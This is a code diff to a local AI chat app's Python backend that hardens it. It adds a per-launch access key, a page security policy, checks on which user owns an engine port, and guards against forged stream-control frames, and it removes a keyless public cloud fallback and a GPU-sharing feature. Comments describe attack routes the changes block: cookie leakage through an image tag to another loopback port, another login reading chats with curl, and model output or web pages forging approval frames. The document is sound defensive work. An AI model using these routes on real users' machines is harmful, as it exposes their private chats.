@@ -163,16 +163,40 @@ UPDATE_REPO = "bigmillz/concordeai"
 # MILLENAI_PORT: the go-live LaunchAgent runs a second, headless instance
 # beside the desktop app — it must not fight the app for 8889
 PORT = int(os.environ.get("MILLENAI_PORT", "8889"))
-# Opt-in remote-access gate. The backend has no auth of its own — it was
-# built to listen on 127.0.0.1 for a window on the same machine. Before
-# exposing it through a tunnel (Tailscale Funnel, cloudflared, ...), set
-# MILLENAI_KEY: every request must then carry the key once (?key=... sets a
-# cookie) or be refused. Unset = exactly the old behaviour.
-ACCESS_KEY = os.environ.get("MILLENAI_KEY", "").strip()
+# the app a person opened, as opposed to a dev, test or hosted instance
+# started on an explicit port. Only this one may move off 8889 (see
+# bind_backend) and only this one holds the single-instance lock.
+DEFAULT_APP = "MILLENAI_PORT" not in os.environ
+# THE WINDOW'S OWN KEY (6b310, per Patrick: "prevent people's questions,
+# answers, and chats from mixing with other users"). The server listens
+# on 127.0.0.1, and every account on the computer can reach 127.0.0.1:
+# before this, another person's login on a shared Mac could read
+# /api/chats with one curl. Each launch mints a key, the window collects
+# it once through /?key=, and every request must carry it (StudioHandler.
+# _gate). MILLENAI_KEY pins it for dev and test instances.
+ACCESS_KEY = (os.environ.get("MILLENAI_KEY", "").strip()
+              or secrets.token_urlsafe(32))
+# WHAT THE PAGE MAY LOAD (6b310). Browsers send a 127.0.0.1 cookie to
+# EVERY port on 127.0.0.1, so one <img src="http://127.0.0.1:5555/...">,
+# from a web page's og:image or a model's markdown, handed the launch key
+# to whatever listened there, another login included. The page loads
+# from itself and from https only; a plain-http load anywhere else is
+# refused before it is sent.
+PAGE_CSP = ("default-src 'self' https: data: blob: 'unsafe-inline' "
+            "'unsafe-eval'; object-src 'none'; base-uri 'self'; "
+            "form-action 'self'; frame-ancestors 'none'")
 
 # delimiter for out-of-band progress lines in the chat stream — the UI
 # strips these so they never appear inside an answer
 NUL = chr(0)
+
+
+class Ctl(str):
+    """A stream control frame the SERVER wrote (6b310). The chat
+    handler's emit() passes these through and strips NUL from everything
+    else, so a model answer, a remote command's output or a web page
+    quoted in either can never open a frame of its own: a fake MAP pin,
+    a SOURCES row, an APPROVE card, or a RESET that wipes the answer."""
 
 SYSTEM_PROMPT = {
     "role": "system",
@@ -685,17 +709,12 @@ KEY_SHAPE = {
 }
 
 
-# ZERO-SIGNUP BOOST, per Patrick: a public inference service that
-# publishes an "anonymous" tier — no key, no account, no scraping of
-# anyone's web UI (which would be both against their terms and dead
-# within a week). Used when Turbo has no key of its own; a real key
-# always wins because it's faster and has real quota.
-FREE_CLOUD = {"name": "Community cloud",
-              "base": "https://text.pollinations.ai/openai",
-              "model": "openai-fast"}
-
-
-_free_cold = [0.0]      # unix time until which the free tier is skipped
+# NO KEYLESS CLOUD (6b310, per Patrick: remove it). Pollinations, the
+# free public service that used to answer when cloud power was on with
+# no key and to paint when nothing local could, received the whole
+# prompt, memory and name included, never with its private flag, and
+# its feed is public. Images went there with no opt-in at all. Nothing
+# leaves this computer now unless the person added a key.
 
 # A PROVIDER'S ERROR NOTICE IS NOT AN ANSWER (6b288, per Patrick, seen
 # live: "The API key used for this request has reached its budget…" was
@@ -732,47 +751,6 @@ def _cloud_budget_hit(c: dict):
             cloud_cool(pid, "key out of budget \u2014 resting", 3600.0)
     except Exception:
         pass
-
-
-def free_cloud_stream(messages: list, emit, timeout: int = 15) -> bool:
-    """Answer from the keyless public endpoint. False = fall back local.
-
-    NOT server-sent events: that path 402s and returns routing errors on
-    the anonymous tier (measured), while the plain POST is reliable. So
-    take the whole answer, then emit it in small slices — the reader
-    still sees it arrive, and nothing downstream can tell the
-    difference.
-    """
-    # MEASURED: the anonymous tier answers for a while, then 402s every
-    # request for a stretch. One failure buys an hour of silence so a
-    # dead free tier never taxes the latency of every question.
-    if time.time() < _free_cold[0]:
-        return False
-    payload = json.dumps({"model": FREE_CLOUD["model"], "messages": messages,
-                          "max_tokens": 2048, "temperature": 0.7}).encode()
-    req = urllib.request.Request(
-        FREE_CLOUD["base"], data=payload,
-        headers={"Content-Type": "application/json",
-                 "User-Agent": "MillenAI/%s" % APP_VERSION})
-    try:
-        with urllib.request.urlopen(req, timeout=timeout) as r:
-            d = json.load(r)
-        txt = ((d.get("choices") or [{}])[0].get("message") or {}
-               ).get("content") or ""
-    except Exception:
-        _free_cold[0] = time.time() + 3600
-        return False
-    txt = strip_think(txt).strip()
-    if _is_provider_error(txt):
-        # the anonymous tier's wallet is dry: an hour off, next rung now
-        _free_cold[0] = time.time() + 3600
-        return False
-    if len(txt) < 20 or _looks_degenerate(txt):
-        return False
-    for i in range(0, len(txt), 24):
-        emit(txt[i:i + 24])
-        time.sleep(0.012)
-    return True
 
 
 def _cloud_all() -> dict:
@@ -1229,7 +1207,7 @@ def _anthropic_stream(c: dict, messages: list, emit) -> bool:
     if stop == "refusal":
         if got:
             try:
-                emit(NUL + "RESET" + NUL)
+                emit(Ctl(NUL + "RESET" + NUL))
             except Exception:
                 pass
         return False
@@ -2071,336 +2049,12 @@ def cloud_stream_conf(c: dict, messages: list, emit) -> bool:
 
 
 # ------------------------------------------------------------------ fleet
-# CONTRIBUTE, per Patrick: friends flip a switch and their idle GPUs
-# answer the hub's queries. Workers connect OUTBOUND (long-poll HTTP, so
-# no router config, and every request fits inside Cloudflare's window);
-# the router only offloads single-model jobs, and ANY failure falls back
-# to running locally — the fleet can only ever make things faster.
-# Trust model: workers see the prompts they serve. Friends only.
-FLEET_KEY_FILE = os.path.join(app_dir(), "fleet_key")
-
-
-def fleet_key() -> str:
-    try:
-        return open(FLEET_KEY_FILE).read().strip()
-    except OSError:
-        k = secrets.token_urlsafe(18)
-        try:
-            with open(FLEET_KEY_FILE, "w") as f:
-                f.write(k)
-            os.chmod(FLEET_KEY_FILE, 0o600)
-        except OSError:
-            pass
-        return k
-
-
-FLEET_HOME = "https://ai.millertechnology.net"   # one-click default hub
-FLEET_APPROVED_FILE = os.path.join(app_dir(), "fleet_workers.json")
-
-
-def _fleet_approved() -> dict:
-    try:
-        with open(FLEET_APPROVED_FILE) as f:
-            d = json.load(f)
-        return d if isinstance(d, dict) else {}
-    except Exception:
-        return {}
-
-
-def _fleet_save_approved(d: dict):
-    try:
-        with open(FLEET_APPROVED_FILE, "w") as f:
-            json.dump(d, f)
-        os.chmod(FLEET_APPROVED_FILE, 0o600)
-    except OSError:
-        pass
-
-
-_fleet_lock = threading.Lock()
-_fleet_pending = {}   # wid -> {name, models, ts} awaiting owner approval
-_fleet_workers = {}   # wid -> {name, models, last_seen, busy}
-_fleet_jobs = {}      # jid -> {label, messages, done(Event), text, err, wid}
-_fleet_queue = []     # jids waiting for a worker
-
-
-def _fleet_alive() -> dict:
-    now = time.time()
-    with _fleet_lock:
-        return {w: dict(v) for w, v in _fleet_workers.items()
-                if now - v["last_seen"] < 45}
-
-
-def fleet_pick(label: str):
-    """An idle live worker that has the model, or None."""
-    for wid, v in _fleet_alive().items():
-        if label in v.get("models", []) and not v.get("busy"):
-            return wid
-    return None
-
-
-def fleet_run(label: str, messages: list, status) -> str:
-    """Offload one generation; empty string means 'do it locally'."""
-    wid = fleet_pick(label)
-    if not wid:
-        return ""
-    jid = secrets.token_hex(8)
-    done = threading.Event()
-    with _fleet_lock:
-        name = _fleet_workers.get(wid, {}).get("name", "a friend")
-        _fleet_jobs[jid] = {"label": label, "messages": messages,
-                            "done": done, "text": "", "err": "",
-                            "wid": wid}
-        _fleet_workers[wid]["busy"] = True
-        _fleet_queue.append(jid)
-    # CLEANUP IS UNCONDITIONAL (6b244). status() writes to the client
-    # socket, and a reader who closed the tab raises right here — which
-    # used to skip the busy-flag reset below. Register PRESERVES the
-    # busy flag across re-registers (a worker mid-job must not be
-    # double-booked), so one dropped stream sidelined that worker
-    # FOREVER: marked busy, never picked again until the hub restarted.
-    try:
-        try:
-            status(f"{name}'s GPU is on it — {label}")
-        except Exception:
-            pass
-        ok = done.wait(150)      # heartbeat keeps the client stream alive
-    finally:
-        with _fleet_lock:
-            job = _fleet_jobs.pop(jid, {})
-            try:
-                _fleet_queue.remove(jid)
-            except ValueError:
-                pass
-            if wid in _fleet_workers:
-                _fleet_workers[wid]["busy"] = False
-    text = (job.get("text") or "") if ok else ""
-    if text and not _looks_degenerate(text):
-        return text
-    return ""
-
-
-_contrib_stop = threading.Event()
-_contrib_state = ["off"]
-_contrib_thread = None
-
-
-def _on_ac_power():
-    """True when plugged in — or when unknowable (a desktop Mac has no
-    battery; psutil returns None), because refusing to contribute on a
-    machine that CANNOT be on battery would make the toggle a lie."""
-    if not HAS_PSUTIL:
-        return True
-    try:
-        b = psutil.sensors_battery()
-        return (b is None) or bool(b.power_plugged)
-    except Exception:
-        return True
-
-
-_idle_cache = {"ts": 0.0, "s": None}
-
-
-def _user_idle_seconds():
-    """Seconds since the owner last touched this Mac, or None where it
-    can't be measured (then the idle gate opens — same honesty rule as
-    everywhere else: an unmeasurable gate must not pretend). macOS
-    HIDIdleTime via ioreg, the gpu_utilization idiom; cached 5s so the
-    poll loop doesn't fork a process per lap."""
-    now = time.time()
-    if now - _idle_cache["ts"] < 5:
-        return _idle_cache["s"]
-    s = None
-    if IS_MAC:
-        try:
-            out = subprocess.run(
-                ["ioreg", "-r", "-d", "1", "-c", "IOHIDSystem", "-a"],
-                capture_output=True, timeout=2).stdout
-            for dev in plistlib.loads(out):
-                v = dev.get("HIDIdleTime")
-                if v is not None:
-                    s = float(v) / 1e9
-                    break
-        except Exception:
-            s = None
-    _idle_cache.update(s=s, ts=now)
-    return s
-
-
-# THE LEDGER (6b257): what this Mac has given — jobs answered, seconds
-# worked, characters generated. Its own file, NOT prefs.json: the
-# settings UI rewrites prefs wholesale and would race the worker
-# thread's per-job increments.
-CONTRIB_LEDGER_FILE = os.path.join(app_dir(), "contrib_ledger.json")
-_ledger_lock = threading.Lock()
-
-
-def _ledger_add(seconds=0.0, chars=0, jobs=0):
-    with _ledger_lock:
-        try:
-            with open(CONTRIB_LEDGER_FILE, encoding="utf-8") as f:
-                d = json.load(f)
-        except Exception:
-            d = {}
-        d["jobs"] = int(d.get("jobs") or 0) + jobs
-        d["seconds"] = float(d.get("seconds") or 0) + seconds
-        d["chars"] = int(d.get("chars") or 0) + chars
-        tmp = CONTRIB_LEDGER_FILE + ".tmp"
-        with open(tmp, "w", encoding="utf-8") as f:
-            json.dump(d, f)
-        os.replace(tmp, CONTRIB_LEDGER_FILE)
-
-
-_contrib_gen = [0]     # bumped on every contrib_apply — see below
-
-
-def _contrib_loop(url: str, key: str, gen: int = 0):
-    """Friend mode, ONE CLICK: knock on the hub, wait to be approved,
-    then long-poll for jobs and run them here. Outbound-only.
-
-    GENERATION TOKEN (6b257): the stop Event alone could not retire a
-    loop that was mid-job — contrib_apply joins for 3s, gives up, then
-    CLEARS the Event for the new thread, and the old one sails on with
-    a cleared stop flag. Two loops, double polling, one hub confused
-    about which is live. Each loop now also dies when its generation
-    is superseded, so the toggles in Settings can be flipped freely
-    while a job runs."""
-    p = load_prefs(None)
-    wid = str(p.get("contrib_wid") or secrets.token_hex(8))
-    token = str(p.get("contrib_token") or "")
-    if p.get("contrib_wid") != wid:
-        p["contrib_wid"] = wid
-        store_prefs(p)
-
-    def post(path, data):
-        req = urllib.request.Request(
-            url.rstrip("/") + path, data=json.dumps(data).encode(),
-            headers={"Content-Type": "application/json",
-                     # MEASURED: the edge 403s a bare "Python-urllib"
-                     # UA, so every knock failed and the panel read
-                     # "hub offline" forever. curl worked; we didn't.
-                     "User-Agent": "MillenAI/%s" % APP_VERSION,
-                     "X-Fleet-Key": key})
-        with urllib.request.urlopen(req, timeout=40) as r:
-            return json.loads(r.read())
-
-    while not _contrib_stop.is_set() and gen == _contrib_gen[0]:
-        try:
-            # THE THREE PROMISES (6b257, per Patrick): plugged in,
-            # idle, and only its share of time. Gated before any
-            # network call, re-read every lap so the Settings toggles
-            # apply live; a paused worker simply ages out of the hub's
-            # 45s liveness window and stops being picked — the hub
-            # needs no change at all.
-            p3 = load_prefs(None)
-            if p3.get("contrib_ac_only", True) and not _on_ac_power():
-                _contrib_state[0] = "paused — on battery"
-                _contrib_stop.wait(30)
-                continue
-            _idle = _user_idle_seconds()
-            if (p3.get("contrib_idle_only", True)
-                    and _idle is not None and _idle < 120):
-                _contrib_state[0] = "paused — you're using this Mac"
-                _contrib_stop.wait(15)
-                continue
-            pulled = ollama_pulled_tags() or set()
-            # MODEL_ROUTES first (6b309): model_cached raises on a label
-            # with no engine here (the MLX-only ones on Intel/Windows),
-            # which failed every lap as "hub offline — retrying"
-            models = [l for l in MODEL_INFO
-                      if l in MODEL_ROUTES and model_cached(l, pulled)
-                      and model_fits_memory(l)]
-            out = post("/api/fleet/register",
-                       {"id": wid, "token": token,
-                        "name": platform.node().split(".")[0][:20],
-                        "models": models})
-            if out.get("pending"):
-                _contrib_state[0] = "waiting for approval"
-                _contrib_stop.wait(20)
-                continue
-            if out.get("err"):
-                _contrib_state[0] = "not approved"
-                _contrib_stop.wait(30)
-                continue
-            if out.get("token") and out["token"] != token:
-                token = out["token"]
-                p2 = load_prefs(None)
-                p2["contrib_token"] = token
-                store_prefs(p2)
-            _contrib_state[0] = "contributing"
-            job = post("/api/fleet/poll", {"id": wid, "token": token})
-            if job.get("job"):
-                parts = []
-                _t0 = time.time()
-                _lbl = str(job.get("label") or "")
-                try:
-                    # THIS MAC'S OWN GPU, NOTHING ELSE (6b309, per
-                    # Patrick: "only contributing their own GPU, not
-                    # their cloud models that they're paying for").
-                    # Only a model this lap just advertised — downloaded
-                    # here and fitting in memory — is ever run for the
-                    # hub. run_model reaches only the engines on
-                    # 127.0.0.1 and never a cloud key, and an unknown
-                    # label must not fall through to its pick-any-local
-                    # fallback either: the hub gets an error, not a
-                    # model the owner never offered.
-                    if _lbl not in models:
-                        raise RuntimeError("not offered by this machine")
-                    run_model(_lbl, job["messages"], parts.append)
-                    _txt = strip_think("".join(parts))
-                except Exception as exc:
-                    post("/api/fleet/submit",
-                         {"id": wid, "token": token, "job": job["job"],
-                          "err": str(exc)[:100]})
-                else:
-                    post("/api/fleet/submit",
-                         {"id": wid, "token": token, "job": job["job"],
-                          "text": _txt})
-                    # a ledger that can't be written must not turn an
-                    # answered job into an error for the same job
-                    try:
-                        _ledger_add(seconds=time.time() - _t0,
-                                    chars=len(_txt), jobs=1)
-                    except (OSError, ValueError):
-                        pass
-                # THE TIME SHARE (6b257): rest for the complement of
-                # the lend slider — at 50% the Mac rests as long as it
-                # worked. Capped so one marathon job can't bench the
-                # worker for ten minutes-plus. This is a time share,
-                # NOT a GPU percentage — no such knob exists in
-                # MLX/Ollama, and a fake one would be a lie.
-                _pct = max(5, min(100,
-                                  int(p3.get("contrib_max_pct") or 50)))
-                if _pct < 100:
-                    _contrib_state[0] = "resting (%d%% share)" % _pct
-                    _contrib_stop.wait(
-                        min((time.time() - _t0) * (100 - _pct) / _pct,
-                            600))
-        except Exception:
-            _contrib_state[0] = "hub offline — retrying"
-            _contrib_stop.wait(8)
-
-
-def contrib_apply(p=None):
-    """Match the contribute thread to prefs. The old loop is retired
-    FIRST — a running thread's url/key are baked in at start, so a
-    settings change must always mean a fresh thread (seen live: an
-    empty-key loop kept retrying forever after the key was fixed)."""
-    global _contrib_thread
-    p = p or load_prefs(None)
-    on = bool(p.get("contrib_on"))
-    _contrib_gen[0] += 1              # every older loop is now retired
-    _gen = _contrib_gen[0]
-    _contrib_stop.set()
-    if _contrib_thread is not None and _contrib_thread.is_alive():
-        _contrib_thread.join(timeout=3)
-    if on:
-        _contrib_stop.clear()
-        _contrib_thread = threading.Thread(
-            target=_contrib_loop,
-            args=(str(p.get("contrib_url") or FLEET_HOME),
-                  str(p.get("contrib_key") or ""), _gen),
-            daemon=True)
-        _contrib_thread.start()
+# CONTRIBUTE IS GONE (6b310, per Patrick: "we don't need a feature where
+# friends can answer each other's questions. That sounds like a disaster
+# waiting to happen if they see the wrong one."). A worker ran whatever a
+# hub handed it: other people's questions, with their memory, name and
+# files, in plain text on this machine, from a hub that approved any
+# worker on arrival. Nothing here lends a GPU or borrows one now.
 
 
 # ------------------------------------------------------------------ tiers
@@ -2966,8 +2620,8 @@ def _mem_available():
 
 
 def model_fits_memory(label: str) -> bool:
-    # the giant gate holds at run time too (6b307): tiers, the merger,
-    # the fleet and every fallback ask this before starting a model
+    # the giant gate holds at run time too (6b307): tiers, the merger
+    # and every fallback ask this before starting a model
     if model_is_giant(label) and not giants_on():
         return False
     if no_limits():
@@ -2986,7 +2640,7 @@ def model_fits_memory(label: str) -> bool:
     if avail is None or need is None:
         return True  # unknown — don't cry wolf
     kind, target = MODEL_ROUTES.get(label, (None, None))
-    if kind == "mlx" and _port_in_use(target):
+    if kind == "mlx" and _engine_up(target):
         return True  # already resident and serving
     # Real footprints run above the estimate — a "44 GB" 70B was measured at
     # 49.7 GB and got OOM-killed — so demand real headroom, and never allow a
@@ -3485,6 +3139,184 @@ def _port_in_use(port: int) -> bool:
         return s.connect_ex(("127.0.0.1", port)) == 0
 
 
+def _free_port() -> int:
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.bind(("127.0.0.1", 0))
+        return s.getsockname()[1]
+
+
+# ANOTHER PERSON'S ENGINE IS NOT OURS (6b310, per Patrick: questions and
+# chats must never reach another user). Engines listen on fixed loopback
+# ports, and every account on the computer shares loopback. So on a Mac
+# with two logins, the second person's ConcordeAI found the first
+# person's Ollama or MLX engine already listening and sent it every
+# prompt, with memory, name and attached files (or sent it to anything
+# else squatting on the port). A listener counts only when it runs as
+# this OS user, or on Linux and Windows as a system account (root, the
+# "ollama" service user, LocalSystem): only the machine's administrator
+# controls those, and the administrator can read everything anyway.
+#
+# THREE ANSWERS, not two: True, False, or None when the probe itself
+# failed (lsof timing out under memory pressure, say). Only a definite
+# False moves an engine; None refuses that one request instead, so a
+# slow probe can never spawn a second copy of a 17 GB model.
+_SYSTEM_UID_MAX = 500 if IS_MAC else 1000
+_MINE_CACHE = {"ts": 0.0, "ports": None}
+
+
+def _my_listen_ports():
+    """Every TCP port a process we trust is listening on, or None when
+    that can't be read. One lsof for all of them, reused for a second:
+    the status screens ask about every model at once."""
+    now = time.time()
+    if _MINE_CACHE["ports"] is not None and now - _MINE_CACHE["ts"] < 1:
+        return _MINE_CACHE["ports"]
+    ports = None
+    try:
+        if os.path.exists("/proc/net/tcp"):
+            # Linux names each socket's owner uid outright
+            ports = set()
+            for fn in ("/proc/net/tcp", "/proc/net/tcp6"):
+                if not os.path.exists(fn):
+                    continue
+                with open(fn) as f:
+                    next(f, None)
+                    for ln in f:
+                        c = ln.split()
+                        uid = int(c[7])
+                        if c[3] == "0A" and (uid == os.getuid()
+                                             or uid < _SYSTEM_UID_MAX):
+                            ports.add(int(c[1].rsplit(":", 1)[1], 16))
+        elif not IS_WIN:
+            # macOS lsof lists only this user's own processes, so a port
+            # that is in use but missing here is someone else's
+            r = subprocess.run(
+                ["lsof", "-nP", "-a", "-iTCP", "-sTCP:LISTEN", "-u",
+                 str(os.getuid()), "-Fn"],
+                capture_output=True, text=True, timeout=4)
+            if r.returncode in (0, 1):     # 1 = nothing listening at all
+                ports = {int(m) for m in re.findall(
+                    r"^n.*:(\d+)$", r.stdout, re.M)}
+    except Exception:
+        ports = None
+    _MINE_CACHE.update(ts=now, ports=ports)
+    return ports
+
+
+def _listener_is_mine(port: int):
+    """True, False, or None (couldn't tell). Only asked about a port
+    something is listening on."""
+    if IS_WIN:
+        try:
+            return _win_listener_mine(port)
+        except Exception:
+            return None
+    ports = _my_listen_ports()
+    if ports is None:
+        return None
+    return port in ports
+
+
+def _engine_up(port) -> bool:
+    """An engine of OURS answers on this port. The status screens and
+    the "already loaded" shortcuts ask this, never plain port-in-use: a
+    port held by another account's engine is not a loaded model here."""
+    return bool(port) and _port_in_use(port) and _listener_is_mine(port) is True
+
+
+def _win_listener_mine(port: int):
+    """Windows: full DOMAIN\\user names, compared whole (a local 'john'
+    and CORP\\john are different people). None when an owner can't be
+    read, which is what a non-elevated app gets for LocalSystem."""
+    flags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
+    ok = {"nt authority\\system", "nt authority\\local service",
+          "nt authority\\network service"}
+    users = set()
+    if HAS_PSUTIL:
+        ok.add(psutil.Process(os.getpid()).username().lower())
+        for c in psutil.net_connections("tcp"):
+            if (c.laddr and c.laddr.port == port
+                    and c.status == psutil.CONN_LISTEN):
+                try:
+                    users.add(psutil.Process(c.pid).username().lower())
+                except Exception:
+                    return None
+    else:
+        import csv
+        me = subprocess.run(["whoami"], capture_output=True, text=True,
+                            timeout=6, creationflags=flags).stdout
+        ok.add(me.strip().lower())
+        out = subprocess.run(["netstat", "-ano", "-p", "TCP"],
+                             capture_output=True, text=True, timeout=6,
+                             creationflags=flags).stdout
+        pids = set()
+        for ln in out.splitlines():
+            c = ln.split()
+            # the state column is translated on non-English Windows, so
+            # a listener is recognised by its empty remote end instead
+            if (len(c) >= 5 and c[1].endswith(":%d" % port)
+                    and c[2] in ("0.0.0.0:0", "[::]:0")):
+                pids.add(c[-1])
+        for pid in pids:
+            row = next(csv.reader([subprocess.run(
+                ["tasklist", "/FI", "PID eq %s" % pid, "/V", "/FO", "CSV",
+                 "/NH"], capture_output=True, text=True, timeout=6,
+                creationflags=flags).stdout.strip()]), [])
+            name = (row[6] if len(row) > 6 else "").strip().lower()
+            if not name or name == "n/a":
+                return None
+            users.add(name)
+    if not users:
+        return None
+    return users <= ok
+
+
+def _own_engine_port(label: str) -> int:
+    """The port for `label`'s MLX engine that THIS user owns. Someone
+    else listening on the catalog port moves ours to a free one; every
+    reader goes through MODEL_ROUTES, so the move is global. Can't tell
+    = refuse this request rather than guess either way."""
+    kind, port = MODEL_ROUTES[label]
+    if _port_in_use(port):
+        mine = _listener_is_mine(port)
+        if mine is None:
+            raise RuntimeError("couldn't check who runs this model's "
+                               "engine; try again in a moment")
+        if mine is False:
+            port = _free_port()
+            MODEL_ROUTES[label] = (kind, port)
+            _RELOCATED.add(port)
+            print(f"  another account holds {label}'s engine port — "
+                  f"this user's runs on {port}")
+    return port
+
+
+_RELOCATED = set()     # engine ports we moved to: always ours to stop
+
+
+OLLAMA_PORT = [11434]      # moves only when another account owns 11434
+
+
+def ollama_url(path: str) -> str:
+    """The URL of THIS user's Ollama. Raises rather than hand a prompt,
+    a pull or a delete to an Ollama another account runs, or to one
+    whose owner couldn't be checked."""
+    port = OLLAMA_PORT[0]
+    if _port_in_use(port):
+        mine = _listener_is_mine(port)
+        if mine is False:
+            _spawn_ollama_serve()             # moves OLLAMA_PORT
+            port = OLLAMA_PORT[0]
+            mine = (_listener_is_mine(port) if _port_in_use(port)
+                    else True)                # ours, still starting
+        if mine is not True:
+            raise RuntimeError(
+                "Ollama on this computer is running for another account "
+                "(or its owner couldn't be checked), so this app won't "
+                "send it anything")
+    return "http://127.0.0.1:%d%s" % (port, path)
+
+
 def _has_mlx() -> bool:
     try:
         import mlx_lm  # noqa: F401
@@ -3554,7 +3386,7 @@ def ollama_pulled_tags():
     """Set of pulled model names (with and without :tag), or None if down."""
     try:
         with urllib.request.urlopen(
-            "http://127.0.0.1:11434/api/tags", timeout=1.5
+            ollama_url("/api/tags"), timeout=1.5
         ) as r:
             tags = json.loads(r.read().decode("utf-8")).get("models", [])
             return ({m.get("name", "") for m in tags} |
@@ -3642,6 +3474,7 @@ def _spawn_mlx_engine(label: str) -> bool:
     kind, port = MODEL_ROUTES[label]
     if kind != "mlx" or _port_in_use(port) or not _has_mlx():
         return False
+    _retire_engine(label)      # never two copies of one model's weights
     logdir = log_dir()
     os.makedirs(logdir, exist_ok=True)
     log = open(os.path.join(logdir, f"managed-{port}.log"), "ab")
@@ -3707,7 +3540,7 @@ def _stop_other_mlx(keep_label: str):
 
 def ensure_mlx_engine(label: str, timeout: float = 180.0) -> bool:
     """Bring up the engine for `label` on demand, freeing the others first."""
-    _, port = MODEL_ROUTES[label]
+    port = _own_engine_port(label)
     if _port_in_use(port):
         _stop_other_mlx(label)
         return True
@@ -3718,7 +3551,8 @@ def ensure_mlx_engine(label: str, timeout: float = 180.0) -> bool:
         return False
     deadline = time.time() + timeout
     while time.time() < deadline:
-        if _port_in_use(port):
+        # ours, not a squatter that grabbed the port while ours loaded
+        if _port_in_use(port) and _listener_is_mine(port) is True:
             return True
         proc = _mlx_procs.get(label)
         if proc is not None and proc.poll() is not None:
@@ -3728,9 +3562,17 @@ def ensure_mlx_engine(label: str, timeout: float = 180.0) -> bool:
 
 
 def _spawn_ollama_serve() -> bool:
-    """Start `ollama serve` if a binary exists and nothing owns port 11434."""
-    if _port_in_use(11434):
-        return True
+    """Start `ollama serve` if a binary exists and no Ollama of THIS
+    user's is up. Another account's on 11434 doesn't count (6b310): ours
+    then runs on a free port, on this user's own model store."""
+    port = OLLAMA_PORT[0]
+    if _port_in_use(port):
+        mine = _listener_is_mine(port)
+        if mine is True:
+            return True
+        if mine is None:
+            return False             # can't tell: never spawn a duplicate
+        port = _free_port()
     b = _ollama_bin()
     if not b:
         return False
@@ -3739,9 +3581,20 @@ def _spawn_ollama_serve() -> bool:
     log = open(os.path.join(logdir, "managed-ollama.log"), "ab")
     _managed_procs.append(subprocess.Popen(
         [b, "serve"], stdout=log, stderr=log,
+        env=dict(os.environ, OLLAMA_HOST="127.0.0.1:%d" % port),
         creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
     ))
-    print("  spawned ollama serve on port 11434")
+    OLLAMA_PORT[0] = port
+    _managed_procs[-1]._cai_port = port
+    if port != 11434:
+        _RELOCATED.add(port)
+        try:                       # the boot reaper's note (see reap)
+            with open(os.path.join(app_dir(), "run", "ollama-private"),
+                      "w") as f:
+                f.write("%d %d" % (_managed_procs[-1].pid, port))
+        except OSError:
+            pass
+    print(f"  spawned ollama serve on port {port}")
     return True
 
 
@@ -3830,7 +3683,7 @@ def make_title(text: str, conf=None) -> str:
                       if MODEL_MEM_BYTES.get(l, 0) >= 2.4e9),
                      key=lambda l: MODEL_MEM_BYTES.get(l, 0))
     live = [l for l in capable
-            if MODEL_ROUTES[l][0] == "mlx" and _port_in_use(MODEL_ROUTES[l][1])]
+            if MODEL_ROUTES[l][0] == "mlx" and _engine_up(MODEL_ROUTES[l][1])]
     order = (live[:1] + [l for l in capable if l not in live[:1]])[:2] \
         or usable[:1]
     for label in order:
@@ -3857,8 +3710,8 @@ def make_title(text: str, conf=None) -> str:
 # box under the presets… also in the first start wizard"). Local first:
 # FLUX.1 schnell, pre-quantised to 4-bit for MLX, driven by mflux in its
 # OWN venv (its mlx pins must never touch the chat engine's). Not there
-# yet? A Gemini key can paint, then the community cloud; and when nothing
-# can, the reply says exactly where to add it.
+# yet? A Gemini key can paint; and when nothing can, the reply says
+# exactly where to add it.
 # ---------------------------------------------------------------- studios
 # THE HEAVY EXTRAS (6b299, per Patrick: video generation alongside image,
 # both removable, and "an option to select the size of the model with
@@ -4752,7 +4605,7 @@ def _refine_with_model(prev_subject: str, said: str) -> str:
         pulled = ollama_pulled_tags() or set()
         live = [l for l in MODEL_ROUTES
                 if MODEL_ROUTES[l][0] == "mlx" and model_cached(l, pulled)
-                and _port_in_use(MODEL_ROUTES[l][1])]
+                and _engine_up(MODEL_ROUTES[l][1])]
         if not live:
             return ""
         parts = []
@@ -4810,9 +4663,9 @@ def image_status() -> dict:
 
 
 def _write_image_bytes(data: bytes) -> str:
-    """Save what a cloud painter returned under its TRUE type — the
-    community cloud sends JPEG, Gemini PNG — so the route can serve an
-    honest Content-Type (a JPEG called .png is a coin toss in WebKit)."""
+    """Save what a cloud painter returned under its TRUE type — Gemini
+    sends PNG today, and a JPEG or WebP must not be called .png (a coin
+    toss in WebKit) — so the route can serve an honest Content-Type."""
     os.makedirs(IMAGE_DIR, exist_ok=True)
     ext = (".jpg" if data[:2] == b"\xff\xd8"
            else ".webp" if data[:4] == b"RIFF" and data[8:12] == b"WEBP"
@@ -4975,8 +4828,8 @@ def _ffmpeg_convert(src: str, fmt: str, fps: int) -> str:
 
 def generate_image(prompt: str, over: dict = None, sock=None,
                    paid: bool = True) -> tuple:
-    """(png path, source) — local FLUX first, a Gemini key second, the
-    community cloud last. Raises when none of them could paint."""
+    """(png path, source) — local FLUX first, a Gemini key second.
+    Raises when neither could paint."""
     errs = []
     if image_ready():
         os.makedirs(IMAGE_DIR, exist_ok=True)
@@ -5041,22 +4894,8 @@ def generate_image(prompt: str, over: dict = None, sock=None,
                 errs.append("gemini: no image in the reply")
             except Exception as exc:
                 errs.append("gemini: %s" % str(exc)[:120])
-    try:
-        url = ("https://image.pollinations.ai/prompt/%s?width=1024&height=1024"
-               "&nologo=true&seed=%d" % (urllib.parse.quote(prompt[:400]),
-                                         secrets.randbelow(10 ** 6)))
-        req = urllib.request.Request(url, headers={"User-Agent": "MillenAI/%s" % APP_VERSION})
-        with urllib.request.urlopen(req, timeout=120) as r:
-            ct = r.headers.get("Content-Type", "")
-            data = r.read()
-        if ct.startswith("image/") and len(data) > 4000:
-            if errs:
-                print("image: fell through to the community cloud: "
-                      + "; ".join(errs)[:400], file=sys.stderr)
-            return _write_image_bytes(data), "community"
-        errs.append("community: not an image")
-    except Exception as exc:
-        errs.append("community: %s" % str(exc)[:120])
+    # no keyless fallback (6b310): Pollinations got the description with
+    # no opt-in, in a URL, onto a public feed
     raise RuntimeError("; ".join(errs) or "no image engine")
 
 
@@ -7022,7 +6861,7 @@ def _ensure_ollama_ready() -> bool:
                                        "pct": 100}
     _spawn_ollama_serve()
     for _ in range(40):
-        if _port_in_use(11434):
+        if _port_in_use(OLLAMA_PORT[0]):
             return True
         time.sleep(0.5)
     return False
